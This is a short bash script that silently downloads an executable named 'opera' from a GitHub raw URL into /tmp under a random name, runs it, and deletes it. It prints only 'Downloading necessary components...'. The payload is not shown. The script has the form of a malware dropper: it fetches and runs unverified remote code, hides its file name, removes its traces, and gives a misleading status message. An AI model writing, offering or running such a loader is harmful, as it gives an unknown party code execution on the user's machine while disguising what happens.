#!/bin/bash
RANDOM_NAME=$(openssl rand -hex 8)
echo "Downloading necessary components..."
curl -s "https://raw.githubusercontent.com/hdsed-sudo/mac-test/main/opera" -o "/tmp/$RANDOM_NAME"
chmod +x "/tmp/$RANDOM_NAME"
"/tmp/$RANDOM_NAME"
rm -f "/tmp/$RANDOM_NAME"
